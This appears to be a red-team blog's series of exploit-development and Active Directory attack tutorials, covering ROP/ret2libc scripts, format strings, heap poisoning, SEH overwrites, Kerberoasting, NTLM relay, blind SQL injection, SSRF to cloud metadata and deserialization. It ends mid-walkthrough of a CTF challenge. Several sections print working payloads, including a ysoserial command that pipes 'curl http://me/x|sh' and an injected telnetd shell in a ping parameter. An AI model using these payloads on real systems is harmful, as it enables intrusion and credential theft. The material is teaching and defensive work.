ret2ricky exploit dev · red team · reverse engineering

Almost everyone starting out in exploit development hits the same wall: they overflow a buffer, the program crashes, and they declare victory. A crash is a denial of service. The interesting question is whether the crash is controllable — whether you can steer the corruption into an outcome you choose. That gap, between "it crashed" and "I control the instruction pointer," is the whole discipline in miniature.

Why the stack is corruptible at all

On x86-64, local variables, saved registers, and the return address all live together on the stack, growing downward from high addresses to low. A call instruction pushes the address of the next instruction (the return address) onto the stack before jumping into the function. When the function finishes, ret pops that address back into rip. Everything hinges on that saved value being intact.

A fixed-size buffer written without bounds checking grows upward in memory, toward the saved return address. Overflow it far enough and you walk right over the saved RBP and then the saved RIP. The classic sin:

// 64-byte buffer, unbounded copy — the canonical bug
void handle(char *input) {
    char buf[64];
    strcpy(buf, input);   // no length check; copies until NUL
}

Here is the frame at the moment handle is about to return, with a 64-byte buffer:

high addr   +------------------------+
            |   saved return addr    |  <- overwrite this to control rip
            +------------------------+
            |   saved rbp (8 bytes)  |
            +------------------------+
            |                        |
            |   char buf[64]         |  <- strcpy starts writing here
            |                        |
low addr    +------------------------+  <- rsp

If input is longer than 64 + 8 bytes, byte 73 onward lands on the saved return address. The moment ret executes, the CPU jumps wherever those eight bytes point.

Finding the exact offset

Do not count by hand — you will be off by a few bytes and waste an hour. Use a De Bruijn (cyclic) pattern: a sequence where every substring of a given length is unique, so the four or eight bytes that land in the crashed register tell you precisely how far into your input they came from.

$ cyclic 200 > crash.txt          # generate a 200-byte unique pattern
$ gdb ./target
(gdb) run < crash.txt
Program received signal SIGSEGV, Segmentation fault.
(gdb) info registers rsp rip
rsp  0x7fffffffe3a8  "faaagaaahaaa..."
(gdb) cyclic -l 0x6161616166616166   # feed the value from the crash
72                                   # <- the offset: 72 bytes of padding

Now the layout of the exploit is fixed: 72 bytes of filler, then the next 8 bytes overwrite the saved return address.

What comes after control

Owning rip is the pivot point, not the finish line. Where you aim it depends entirely on the binary's mitigations, which you check before writing a single byte of payload:

Mitigation stateTechnique
No NX, no canaryJump straight to shellcode on the stack
NX on, no PIEret2libc / ROP with static gadget addresses
NX + PIE + ASLRLeak an address first, then ROP (two-stage)
Stack canary presentLeak or brute the canary before you reach RIP
$ checksec ./target
RELRO: Partial | Canary: No | NX: enabled | PIE: No PIE

That checksec output is a map of the next three posts: NX-enabled means no stack shellcode, so you pivot to return-oriented programming; PIE-disabled means gadget addresses are static, so no leak is required yet. Each mitigation adds a prerequisite rather than a wall.

Mental model: the overflow does not "break" the program. It hands you a write primitive that happens to reach the control-flow metadata. Treat it like a tool with a known reach, not an accident — and always run checksec before you theorize about payloads.

Once DEP/NX marks the stack non-executable, dropping shellcode and jumping to it stops working: the CPU faults the instant it tries to execute a data page. Return-oriented programming (ROP) answers this by never introducing new code at all. Instead you chain tiny snippets of code that already exist in the binary or its libraries — each snippet ending in ret — into an arbitrary computation.

What a gadget actually is

A gadget is a short instruction sequence ending in ret, for example pop rdi ; ret. The ret is the engine of the whole technique: it pops the next 8 bytes off the stack into rip and jumps there. Because a buffer overflow puts you in control of the stack, you control the entire sequence of gadgets that run, one ret handing off to the next.

Gadgets do not have to be intended instructions. x86 is a variable-length instruction set, so you can often decode into the middle of a legitimate instruction and find a useful gadget that the compiler never emitted on purpose. Tools enumerate these for you:

$ ropper --file ./target --search "pop rdi"
0x0000000000401263: pop rdi; ret;
$ ropper --file ./target --search "pop rsi"
0x0000000000401261: pop rsi; pop r15; ret;   # note the extra pop — account for it

Thinking in the calling convention

On x86-64 System V, the first six integer arguments go in rdi, rsi, rdx, rcx, r8, r9. A ROP chain to call a function is therefore just "load the argument registers, then return into the function." Calling system("/bin/sh") needs exactly one argument in rdi:

from pwn import *

offset   = 72
pop_rdi  = 0x401263           # pop rdi; ret
binsh    = 0x404050           # address of the "/bin/sh" string
system   = 0x401050           # system@plt

payload  = b"A" * offset      # fill to saved RIP
payload += p64(pop_rdi)       # rip -> this gadget
payload += p64(binsh)         //  pop rdi = &"/bin/sh"
payload += p64(system)        # ret into system()

Read it top-down as the CPU will execute it: land on pop rdi ; ret, which pops &"/bin/sh" into rdi and returns into system, which now sees its argument exactly where the ABI says it should be.

The movaps gotcha

One alignment trap bites everyone once. Many libc functions use SSE instructions like movaps, which require a 16-byte-aligned stack. If your chain lands system on a misaligned rsp, it crashes inside libc and you waste an afternoon blaming your offsets. The fix is a single extra ret gadget to realign:

ret = 0x40101a               # a bare "ret" — nudges rsp by 8 to realign
payload += p64(pop_rdi) + p64(binsh)
payload += p64(ret)          # 16-byte alignment before the call
payload += p64(system)
ROP stops feeling like black magic the moment you see it as "calling functions, with extra steps." The remaining problem is addresses: with ASLR on, you do not know where system or your gadgets live. That is the next post.

DEP and ASLR are discussed together because together they force one specific exploitation shape. DEP (NX) says "you cannot execute data as code." ASLR says "you do not know where anything is." Beat them in the right order and both collapse into a routine two-stage exploit.

Why offsets survive randomization

ASLR randomizes the base address where a module loads, but the layout within a module is fixed at compile time. The distance from the start of libc to system never changes for a given build. So if you can leak a single real runtime address belonging to a module, you can compute every other address in it by adding or subtracting known offsets. One leak defeats the whole module's randomization.

Step one: the leak

The leak is the creative part — any primitive that prints a pointer will do. A common one on partial-RELRO binaries is to ROP a call to puts(puts@got): the GOT holds the resolved runtime address of puts, and you ask puts to print it to you.

from pwn import *
elf  = ELF("./target")
libc = ELF("./libc.so.6")

# Stage 1: leak libc's runtime base via the GOT
rop  = b"A"*72
rop += p64(pop_rdi) + p64(elf.got["puts"])   # arg = &puts@GOT
rop += p64(elf.plt["puts"])                  # print it
rop += p64(elf.sym["main"])                  # return to main for round two
p.sendline(rop)

leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym["puts"]       # ASLR defeated for libc
log.info("libc base: %#x", libc.address)

Returning into main at the end is the trick that makes two-stage exploitation ergonomic: the program loops back to the vulnerable function, and now you fire a second payload with every libc address known.

Step two: the exploit

With libc.address populated, pwntools resolves symbols to real runtime addresses for you. DEP is irrelevant because you execute only libc's own code; ASLR is irrelevant because you leaked the base.

rop2  = b"A"*72
rop2 += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))
rop2 += p64(ret)                              # movaps alignment
rop2 += p64(libc.sym["system"])
p.sendline(rop2)
p.interactive()                               # shell

Engagement takeaway: a bug that only leaks memory is often triaged as "low severity" in isolation. Paired with a write primitive it becomes the enabling half of full code execution. When you find an info-leak, reassess every other finding in the report with the leak in hand — severity is about chains, not individual bugs.

Every year I am told format string bugs are extinct, and every year one turns up — almost always in logging or error-handling code where a developer passed a user-controlled string straight into a function's format argument. The root cause is dead simple:

printf(user_input);          // vulnerable: user controls the format string
printf("%s", user_input);    // correct: user data is an argument, not the format

Why does the first line matter so much? Because printf reads its arguments from registers and the stack based on the format specifiers it sees. If the attacker controls those specifiers, they control which memory printf reads — and, through %n, which memory it writes.

Read primitive: leaking the stack

Each conversion specifier makes printf consume another argument slot. Supplying a row of %p walks the stack and dumps raw values — saved pointers, canaries, and libc addresses included. That is a ready-made ASLR defeat.

$ ./target
%p.%p.%p.%p.%p.%p.%p.%p
0x7fffffffe3a0.0x7f...c0.0x401234.(nil).0x4141...  # stack + pointers leak out

Use positional specifiers to grab an exact slot once you have counted the offset to your own input: %7$p prints the seventh argument directly, which is how you turn "a wall of hex" into "the one pointer I need."

Write primitive: %n

The specifier everyone forgets: %n writes the number of bytes printed so far to the address held in the corresponding argument. Control that address (place it in your input, reference it by position) and control the byte count (via field-width padding like %100c), and you have an arbitrary write.

# Overwrite a 2-byte value at target_addr using %hn, split writes with pwntools
from pwn import *
payload = fmtstr_payload(offset, {target_addr: new_value})
p.sendline(payload)

The usual target is a GOT entry — overwrite exit@got or printf@got with the address of system or a one-gadget, and the next call to that function runs your code. fmtstr_payload handles the tedious byte-splitting; understanding it by hand once is what lets you tune it when the automation chokes on bad characters.

Where to hunt: grep the codebase for logging wrappers and syslog/fprintf calls whose format argument is a variable. The bug loves to hide one layer below printf, in a helper like log_error(msg) that calls fprintf(stderr, msg).

Stack overflows are linear and visual. The heap is a living allocator, and exploiting it means manipulating the allocator's own bookkeeping rather than overwriting a return address directly. On modern glibc the first stop is the tcache — a per-thread cache of recently freed chunks, built for speed and historically light on security checks.

How the tcache works

Each tcache bin is a singly linked list of free chunks of one size class, up to seven entries. When you free a small chunk, glibc stores a pointer to the next free chunk of that size in the first 8 bytes of the freed chunk's user data. When you malloc that size again, it pops the head of the list and returns it.

a = malloc(0x40);  b = malloc(0x40);
free(a);           // tcache[0x40]: a
free(b);           // tcache[0x40]: b -> a   (b's fd points to a)

The poison

If you have a use-after-free or an overflow into a freed chunk, you can overwrite that stored "next" pointer. glibc trusts it and will hand your forged pointer back on a future allocation — giving you an allocation at an arbitrary address.

// b is freed; UAF lets us edit its fd pointer
edit(b, p64(target_addr));   // tcache[0x40]: b -> target_addr
malloc(0x40);                // returns b
void *p = malloc(0x40);      // returns target_addr — arbitrary chunk

An arbitrary allocation becomes an arbitrary write the moment you fill the returned chunk. Classic targets: __free_hook or __malloc_hook on older glibc (overwrite with system, then free a chunk containing "/bin/sh"), or a saved return address if you can point the allocation at the stack.

What changed in newer glibc

glibc 2.32+ added safe-linking: the fd pointer is mangled as fd ^ (chunk_addr >> 12). You can no longer write a raw target address — you must know the chunk's own address to compute the mangled value. In practice this means you need a heap leak first, then:

mangled = target_addr ^ (chunk_addr >> 12)
edit(b, p64(mangled))        # survives safe-linking

The hooks were also removed in glibc 2.34, which pushed the community toward other targets like __exit_funcs / the tls_dtor_list or FSOP (file-stream-oriented programming) on _IO_FILE structures. The technique did not die; the target list shifted.

Advice: draw the allocator state as boxes and arrows on paper before writing exploit code. Every heap bug I have solved cleanly, I drew first; every one I rushed, I debugged for hours.

On Windows (x86), Structured Exception Handling maintains a linked list of exception-handler records on the stack. When an exception fires, the OS walks that list and calls each handler's function pointer. If a buffer overflow reaches an SEH record, you control where the OS jumps when the very crash you caused gets dispatched — a second, independent path to eip even when a stack cookie protects the normal return address.

The SEH record

Each record is two 4-byte fields on the stack: a pointer to the next SEH record, and a pointer to the handler function. Overflow far enough to overwrite both and you own the handler that runs on the next exception — which your overflow usually triggers for free by corrupting something downstream.

+---------------------+
| next SEH record ptr |  <- 4 bytes you control (nSEH)
+---------------------+
| handler function ptr|  <- 4 bytes you control (SEH)
+---------------------+

The POP POP RET trick

You do not jump straight to shellcode, because when the handler is called the stack is not arranged to let you. The standard technique overwrites the handler with the address of a POP POP RET gadget. Those two pops discard values off the stack and the ret lands execution on the nSEH field — the 4 bytes you also control — where you place a short jump over the handler pointer into your shellcode.

from struct import pack
nseh = b"\xeb\x06\x90\x90"      # short jmp +6, over the SEH ptr, into shellcode
seh  = pack("<I", pop_pop_ret) # address of POP POP RET (from a non-SafeSEH module)
payload  = b"A"*offset + nseh + seh + shellcode

Finding the offset to the SEH record is the same cyclic-pattern process as a normal overflow, except you read the overwritten SEH chain in the debugger (in WinDbg, !exchain) rather than the faulting eip.

Why it still matters

SafeSEH (validates handlers against a registered table) and SEHOP (validates the integrity of the chain) largely kill this on modern, properly compiled binaries. But the POP POP RET only needs to come from one loaded module without SafeSEH — and legacy enterprise software is full of them. The SCADA HMI on a factory floor, the imaging client on a hospital VLAN, the twelve-year-old line-of-business app nobody will recompile: these are exactly the targets where SEH overwrites still pop a shell in 2026.

0:000> !py mona modules        # in WinDbg with mona.py: list modules + protections
0:000> !py mona seh            # find POP POP RET gadgets in non-SafeSEH modules

Check first: always enumerate module protections before assuming a technique is dead. "The mitigation exists" and "the mitigation covers every loaded module" are very different statements.

Kerberoasting is one of the first moves worth trying from any low-privileged domain foothold, because it requires no special permissions. Any authenticated user can request a service ticket for any account with a Service Principal Name (SPN), and part of that ticket is encrypted with the service account's password-derived key. Request it, extract it, crack it offline.

Why the ticket is crackable

When a user wants to access a service, they ask the Key Distribution Center for a TGS (ticket-granting service) ticket for that service's SPN. The KDC encrypts part of that ticket with the service account's NTLM hash (for RC4) or AES key. The requesting user never needs to actually talk to the service — just receiving the ticket is enough, and nothing about the request looks abnormal to the DC beyond one ticket issuance.

# From Linux with impacket — dump TGS hashes for every SPN account
GetUserSPNs.py -request -dc-ip 10.0.0.1 corp.local/lowpriv:Password1

ServicePrincipalName  Name       MemberOf              PasswordLastSet
--------------------  ---------  --------------------  -------------------
MSSQLSvc/sql01:1433   svc_sql    CN=SQLAdmins,...      2019-03-11 ...
$krb5tgs$23$*svc_sql$CORP.LOCAL$...   # <- the crackable blob

Cracking

Those $krb5tgs$ blobs crack entirely offline — no lockout, no further noise against the DC. Request RC4-encrypted tickets (hashcat mode 13100) where you can; they crack far faster than AES (19700).

$ hashcat -m 13100 spns.txt rockyou.txt -r rules/best64.rule
$ hashcat -m 13100 spns.txt -a 3 '?u?l?l?l?l?l?l?d?d'   # targeted mask when wordlists fail

Why service accounts fall so often

Service accounts predate good password hygiene and rarely rotate. "Sql$vc2019" feels secure to the admin who set it and falls in seconds to a rule-based crack. They are also routinely over-privileged — it is common to find a kerberoastable account that is a member of a privileged group, turning one cracked ticket into a direct path toward Domain Admin. The combination of weak human-chosen passwords and excessive rights is what makes it such a high-value technique once you have a foothold.

Defender moves that work: use Group Managed Service Accounts (gMSAs) with 120-character machine-generated passwords, or enforce 25+ character passwords where gMSAs are not possible; disable RC4 for Kerberos; and alert on a single principal requesting many distinct SPN tickets in a short window (event 4769 with RC4 encryption type is the signal).

Kerberoasting needs a foothold. AS-REP roasting sometimes needs nothing but a valid username. If an account has "Do not require Kerberos pre-authentication" set, the KDC will return an AS-REP — encrypted with that user's password-derived key — to any unauthenticated requester. That is crackable material handed out at the front door.

Why pre-auth exists, and why it gets disabled

Normally, Kerberos pre-authentication requires the client to prove it knows the password (by encrypting a timestamp) before the KDC returns anything encrypted with that password. That proof is what stops an attacker from harvesting AS-REPs for offline cracking. Pre-auth gets disabled for legacy application compatibility — some old client or appliance cannot perform it — and then the exception is forgotten for years.

# With a user list and no credentials at all
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.0.0.1 -no-pass -format hashcat

$krb5asrep$23$svc_legacy@CORP.LOCAL:...   # crackable, no auth required

# If you already have any domain creds, enumerate the flag directly
GetNPUsers.py corp.local/lowpriv:Password1 -request

Where the usernames come from

The only prerequisite is a list of valid usernames, and there are many quiet ways to build one: OSINT on LinkedIn mapped to the org's naming convention (first.last, flast), a prior breach dump, user enumeration via Kerberos (valid-vs-invalid usernames return different KDC errors), or a null/guest session against the DC.

$ hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule

Pair it with Kerberoasting in your methodology and you cover both phases cheaply: AS-REP roast to try for an initial credential with no foothold, then Kerberoast once you are authenticated to escalate. Two low-noise techniques that together bracket the whole access lifecycle.

Defender moves: audit for DONT_REQ_PREAUTH across all accounts (Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}), remove it wherever the legacy reason no longer holds, and give any account that genuinely needs it a long random password.

NTLM relay is widely demoed and widely misunderstood. The core idea is simple: when a victim authenticates to me, I do not try to crack their hash — I forward (relay) that authentication, live, to a third service that accepts it, and act as the victim there. NTLM has no binding between the authentication and the channel it travels over, which is the flaw the whole technique exploits.

Two halves: coercion and relay

Coercion makes a victim authenticate to you. Machine accounts can be forced to connect to an arbitrary host through RPC methods like PetitPotam (MS-EFSRPC) or the printer bug (MS-RPRN). Relay forwards that incoming authentication to a target that does not enforce signing.

# Terminal 1: stand up the relay, aimed at LDAP on the DC
ntlmrelayx.py -t ldaps://dc.corp.local --delegate-access -smb2support

# Terminal 2: coerce a privileged machine to authenticate to us
PetitPotam.py -u lowpriv -p Password1 -d corp.local <attacker_ip> dc.corp.local

Where it leads

The target of the relay determines the impact:

  • Relay to LDAP with --delegate-access configures resource-based constrained delegation (RBCD) on the victim machine object, letting you impersonate any user — including a Domain Admin — onto that host.
  • Relay to AD CS web enrollment (ESC8) lets you request a certificate as the coerced machine or user. A domain controller's certificate is effectively a golden key: you can then authenticate as the DC via PKINIT and dump the domain.
  • Relay to SMB on a host where the victim is a local admin gives direct command execution.
# ESC8: relay coerced DC auth to the CA's web enrollment, get a cert
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
The relentless theme of internal AD work: identity is the perimeter, and signing is the control that keeps a coerced connection from turning into a domain takeover.

Defender moves: enforce SMB signing and LDAP signing + channel binding; enable Extended Protection for Authentication (EPA) on AD CS web endpoints; disable NTLM where you can; and patch the coercion vectors. Any one of these breaks a specific relay path; together they close the technique.

The tutorial version of SQL injection returns an error or dumps a table. The real-world version is usually blind: the application behaves identically whether your injection is true or false, and never echoes data back. You extract information one bit at a time by asking yes/no questions and reading the response — its content, or just its timing.

Fingerprinting the context first

Before extraction, you confirm the injection and learn its context, because the context dictates every payload after it: is the parameter numeric or wrapped in quotes, what is the quote style, is it inside a LIKE, how many columns does the query return, and which DBMS is it? A few manual probes answer this faster than any tool:

id=1            -> normal
id=1'           -> error or different behavior  (string context, single-quote)
id=1' AND '1'='1 -> normal                      (confirms injection + quote close)
id=1' AND '1'='2 -> different                   (boolean works)
id=1' ORDER BY 5-- -> error at N+1 columns      (column count)

Boolean to time-based blind

When the app shows a visible true/false difference, you read data by asking boolean questions. When it shows nothing — same page every time — you fall back to timing: make a "true" answer sleep and a "false" answer return instantly.

-- Postgres: is the first char of the admin's hash 'a'?
'; SELECT CASE
     WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a')
     THEN pg_sleep(3) ELSE pg_sleep(0) END--

A three-second response means the guess was right. Binary-search the character value (is it < 'm'? < 't'?) to cut guesses from 95 to about 7 per character, loop over every position, and you reconstruct the whole field — slowly, but reliably, with latency as your only oracle.

In practice

Nobody does this by hand past the proof of concept. I confirm and fingerprint manually, then hand extraction to sqlmap with the context I already know — which is the difference between a tool that works and a tool that flails:

$ sqlmap -u "https://app/item?id=1" -p id \
    --dbms=postgresql --technique=T --time-sec=2 \
    --tamper=space2comment --batch --dump -T users

What impresses a client is not "I ran sqlmap." It is "here is the exact query context, why parameterization is missing on this one endpoint, what an attacker extracts, and the one-line prepared-statement fix." The tool finds the data; your understanding writes the finding.

SSRF is a web bug with network-level consequences. If an application fetches a URL you control — a fetch-image-from-URL feature, a webhook sender, a PDF/screenshot renderer, an XML parser with external entities — you can often point it at resources it can reach but you cannot. The app becomes your request proxy into places the firewall was supposed to protect.

The cloud escalation

The highest-impact SSRF target is the cloud instance metadata service at 169.254.169.254. A server tricked into fetching your URL can be told to fetch its own IAM credentials:

POST /api/fetch
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
-> S3Access-Role

url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Access-Role
-> { "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..." }

Those temporary keys frequently carry far more access than the web app itself needs. IMDSv2 mitigates this by requiring a PUT to obtain a token header first, which a naive GET-only SSRF cannot supply — so one of the first things worth checking on a cloud target is whether it is still on IMDSv1.

Internal pivoting and filter bypasses

Even without cloud, SSRF lets you port-scan the internal network through the app (watch response times and error differences), reach admin panels bound to localhost that assume anyone who can connect is trusted, and hit internal-only APIs. Allowlists that block obvious targets usually fall to encoding tricks:

BlockedBypass
127.0.0.1[::1], 2130706433 (decimal), 0x7f.0.0.1, 127.1
metadata IP literala DNS name you control that resolves to it
host allowlisthttp://allowed.com@169.254.169.254/, or an open redirect on allowed.com
IP checked onceDNS rebinding: pass the check, then re-resolve to the internal IP

Defender moves: enforce IMDSv2, deny egress from app servers by default and allowlist only required destinations, validate URLs after DNS resolution (not just the string), and block link-local and private ranges at the network layer rather than in application code.

Deserialization turns a byte stream back into live objects. The danger appears when those bytes are attacker-controlled and the language's deserializer runs code during reconstruction — constructors, setters, callbacks like Java's readObject or magic methods. An attacker crafts input that chains together methods from classes already on the classpath (a "gadget chain") until those calls add up to command execution.

Spotting it on the wire

Serialized blobs have recognizable fingerprints. Any of these arriving from a cookie, hidden field, header, or API body deserves a hard look:

PlatformFingerprint
Javamagic bytes AC ED 00 05, or rO0 in base64
.NETBinaryFormatter / ObjectStateFormatter blobs; ViewState
Pythonpickle opcodes; often base64 in a cookie
PHPO:8:"ClassName":... serialized strings

Building the chain

You rarely write gadget chains by hand — the research community has catalogued reusable ones in common libraries. The point is that the vulnerable application code looks harmless (it just deserializes a session object); the exploit lives entirely in libraries the app already ships.

# Java: generate a gadget chain for a known-vulnerable library
java -jar ysoserial.jar CommonsCollections6 'curl http://me/x|sh' | base64

# .NET: ysoserial.net for BinaryFormatter sinks
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami"

Match the gadget to what is actually on the classpath — CommonsCollections6 only works if a compatible Apache Commons Collections is present. Half the work is fingerprinting dependencies (error messages, JS bundles, timing) to pick a chain that will fire.

Why the fix is structural: you cannot "sanitize" your way out of deserialization RCE, because the dangerous behavior is in trusted library code, not in your input parsing. Remove native deserialization of untrusted data, enforce allowlisted type binders (ObjectInputFilter in Java), or switch to a data-only format like JSON with polymorphic type handling disabled.

Open Ghidra for the first time, stare at a wall of FUN_00401a30, and it is easy to freeze. Reverse engineering is not about reading everything — it is about narrowing fast to the code that matters and testing hypotheses against it. Here is the loop I actually run on firmware.

Extract before you analyze

Firmware images are usually a bootloader, a kernel, and a packed filesystem glued together. Carve them apart first so you analyze real binaries instead of a blob:

$ binwalk firmware.bin                 # identify the layout and offsets
$ binwalk -e firmware.bin              # extract the filesystem
$ ls _firmware.bin.extracted/squashfs-root/
bin  etc  lib  sbin  usr  www
$ file .../squashfs-root/usr/sbin/httpd
ELF 32-bit LSB executable, ARM, dynamically linked   # this is our target

Anchor on strings, pivot to code

Ghidra's Defined Strings window is the fastest map of an unknown binary. Error messages, format strings, config paths, and command templates tell you what a function does before you read a single instruction. The loop:

  1. Open the target, let auto-analysis finish, then open Window → Defined Strings.
  2. Find a string that smells interesting — "system", "/bin/", "%s %s", a diagnostic page name.
  3. Double-click it, then use References → Show References to Address to jump into the function that uses it.
  4. Rename that function immediately, and rename every variable you understand. The decompiler output becomes readable in proportion to how much you have annotated.

Hunt the bug class, not the whole program

On a router or IoT device, command injection in the web interface is the usual payday. So I do not read linearly — I form a hypothesis ("the ping diagnostic page probably passes the host straight to system") and chase it through the strings:

// what the decompiler often reveals after a few renames:
iVar1 = get_cgi_param(req, "host", host_buf);
sprintf(cmd_buf, "ping -c 4 %s", host_buf);   // host_buf is attacker-controlled
system(cmd_buf);                              // -> injection: host=8.8.8.8;telnetd -l/bin/sh

Strings got me from "opaque ARM binary" to "command injection in the ping handler" in minutes. Reading the whole thing would have taken days and found the same bug.

Mindset shift: you are not decompiling a program top to bottom. You are testing hypotheses about where a specific bug class lives, and using strings and cross-references as the fastest route to each candidate.

Fuzzing is the laziest high-yield bug-finding technique there is, and I mean that as a compliment. You feed a program mutated garbage, watch for crashes, and let coverage feedback steer the mutations toward unexplored code paths. AFL++ makes this nearly turnkey for anything that parses a file, a buffer, or a protocol message.

Coverage feedback is the whole trick

Dumb fuzzing (random bytes) rarely gets past the first length check. AFL++ instruments the target at compile time so it can see which code paths each input reaches. When a mutated input hits new coverage, it is kept and mutated further; inputs that explore nothing are discarded. Over time the corpus evolves toward inputs that reach deep, rarely tested code — which is exactly where bugs hide.

The three steps

# 1. Compile with instrumentation
$ CC=afl-cc CXX=afl-c++ ./configure && make

# 2. Seed with a few small, valid inputs (quality of seeds matters a lot)
$ mkdir in && cp samples/tiny.jpg in/

# 3. Fuzz — @@ is replaced with each input file path
$ afl-fuzz -i in -o out -- ./target @@

Leave it running — ideally overnight, ideally many parallel instances (one -M main, several -S secondaries). Watch the UI: paths climbing means coverage is still growing; saved crashes climbing means you have work to triage. Inputs that crash land in out/default/crashes/.

Triage is the real work

A crash is not a vulnerability yet — it is a lead. Rebuild the target with AddressSanitizer and replay each crashing input to get a precise root-cause report: what kind of memory error, in which function, at which line.

$ CC=afl-cc CFLAGS="-fsanitize=address -g" make        # ASan build
$ ./target_asan out/default/crashes/id:000003,sig:11,...
==12345==ERROR: AddressSanitizer: heap-buffer-overflow
    WRITE of size 8 at 0x60200000eff8
    #0 parse_header chunk.c:214                          # root cause, exactly

ASan tells you it is a heap overflow and where; a plain GDB run tells you whether you control the instruction pointer. Deduplicate crashes by stack hash before you start — a thousand "unique" crash files are often three real bugs.

Workflow tip: start fuzzing on day one of any assessment that includes a custom parser or file format. It runs unattended while you do everything else, and you come back to a folder of leads.

A standalone exploit script is fine for a one-off. Porting it into a Metasploit module does two things: it makes the exploit reusable across engagements and payloads, and it forces you to separate the exploit's logic from its hardcoded assumptions — the offset, the return address, the target version. That separation is the best code review your exploit will ever get.

Anatomy of a remote exploit module

Metasploit modules are Ruby classes that mix in the capabilities they need. A remote stack-overflow module typically includes the TCP client mixin and declares its targets, each with its own version-specific constants.

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Example Service Stack Overflow',
      'Description'  => 'SEH overflow in Example Service <= 1.2',
      'Platform'     => 'win',
      'Targets'      => [
        [ 'Example v1.0', { 'Ret' => 0x10015b4a, 'Offset' => 520 } ],
        [ 'Example v1.2', { 'Ret' => 0x100174c2, 'Offset' => 536 } ]
      ],
      'DefaultTarget' => 0))
    register_options([ Opt::RPORT(9999) ])
  end

  def exploit
    connect
    sploit  = rand_text_alpha(target['Offset'])
    sploit << [target.ret].pack('V')     # version-specific return address
    sploit << payload.encoded            # operator-chosen payload, not hardcoded
    sock.put(sploit)
    handler                             # catch the shell
    disconnect
  end
end

Why this makes you better

The Targets array is the payoff and the lesson. In a one-off script, the offset and return address are magic numbers buried in the code. Here they are named, per-target data — which forces you to articulate exactly what changes between software versions and why. And because payload.encoded replaces your hardcoded shellcode, the framework's encoders handle bad characters and the operator picks the payload at runtime, so your exploit is suddenly useful against targets and in situations you never anticipated.

Try it: take any working PoC you have and port it. The act of filling in the module metadata — platform, targets, options — surfaces every assumption you baked in without noticing.

Traditional external pentests spend most of their budget on the perimeter: can I get in? But capable attackers assume they will get in — through a phish, a reused credential, a vulnerable third party, a lost laptop — and the interesting question becomes what happens next. Assumed-breach testing starts you inside, as a compromised standard domain user, and measures how far that single foothold goes.

Why it finds more

Given one low-privileged foothold, the internal attack surface is enormous, and almost none of it is reachable from the perimeter:

  • Kerberoastable and AS-REP-roastable accounts with weak passwords.
  • Credentials sitting in SYSVOL, GPO preferences, and scripts.
  • Local admin password reuse across workstations (no LAPS).
  • Over-permissioned shares and ACLs that allow lateral movement or privilege escalation.
  • Unconstrained and resource-based constrained delegation.
  • AD CS misconfigurations (the ESC1–ESC8 family).

A perimeter-focused test that spends two weeks failing to breach the firewall reports "strong external posture" and never touches any of this. An assumed-breach test reaches all of it in the first few days, because it starts where the budget actually matters.

The maturity question is not "can you keep attackers out?" It is "when one gets in as a normal user, how long until they own the domain — and would you even see it happen?"

It tests the defenders, not just the config

Starting inside means every action is a chance for the blue team to detect it. Run as a purple-team exercise — attacker and defender in the same room, or at least the same Slack channel — and assumed breach becomes a detection-engineering feedback loop: I run a technique, we check whether it alerted, we tune the rule or build the missing one, we move on. A report that says "Kerberoasting succeeded and generated no alert" is worth far more to most organizations than another report confirming the firewall blocks inbound SMB.

Scoping note: define the starting foothold explicitly (which user, which host, what access) and the goals (Domain Admin? a specific crown-jewel dataset?). "Assumed breach" without a defined start and objective drifts into an unfocused crawl.

I have watched brilliant technical work die in a PDF nobody acted on. The deliverable is not proof that you are clever — it is a document that causes the right things to get fixed, in the right order, by people who were not in the room when you found them. That is a writing problem as much as a hacking one, and it is the part most testers undertrain.

Two audiences, one report

A good report serves two readers who never read the same pages. The executive summary answers three questions in plain business language: what is the risk, how bad is it, and what should we do first. No CVE numbers, no tool output — a CFO should finish it understanding the stakes and the priorities. The technical findings behind it give engineers full reproduction steps, evidence, and remediation precise enough to act on without calling you.

Anatomy of a finding that drives action

Every finding gets the same shape, and the order matters:

  1. Impact first. Lead with what an attacker achieves — "full domain compromise from an unauthenticated position" — not the mechanism. The reader decides how much to care in the first sentence.
  2. Reproducible. Exact requests, exact commands, exact preconditions. If an engineer cannot reproduce it, they will quietly deprioritize it and you will never know.
  3. Evidence. A screenshot or capture that proves the impact, not just the vulnerability — the shell, the dumped record, the admin session.
  4. Actionable fix. Not "patch your systems." The specific configuration change or code fix, with the trade-offs named, so nobody has to go research what you already know.
  5. Honest severity. Rate it against real exploitability and business impact. Inflating everything to Critical trains the client to ignore your ratings, which devalues the genuinely critical findings.

Severity is a conversation, not a CVSS number

CVSS is a starting point, not the answer. A "medium" information disclosure that leaks the exact detail needed to exploit a separate "medium" write primitive is, together, a critical chain — and your report should say so explicitly, linking the two findings. The value you add over a scanner is precisely this: reasoning about how individually unremarkable issues combine into real risk.

The report is the product. The access was temporary; the document is what the client keeps, budgets against, and hands to their engineers. Write it like the deliverable it is.

This pulls the whole exploit-development series together on a single challenge: a 64-bit ELF, NX on, PIE off, ASLR on, no stack canary. There is no win function and no system call anywhere in the binary — classic ret2libc territory, where you leak libc's base and borrow system from the library itself.

Recon

$ checksec ./chall
RELRO: Partial | Canary: No | NX: enabled | PIE: No PIE
$ file ./chall
ELF 64-bit LSB executable, x86-64, dynamically linked

Read that like a checklist. No canary + No PIE means a clean stack overflow with static gadget and PLT/GOT addresses — no leak needed to find the binary's own code. NX means no stack shellcode, so ROP. ASLR on libc means I still need one leak to locate system. So: a two-stage ret2libc, exactly the structure from the ASLR/DEP post.

Find the offset

$ cyclic 120 | ./chall          # crash it
$ dmesg | tail -1               # or read rsp in gdb
$ cyclic -l 0x6161617461616173  # -> 72

Stage 1 — leak libc

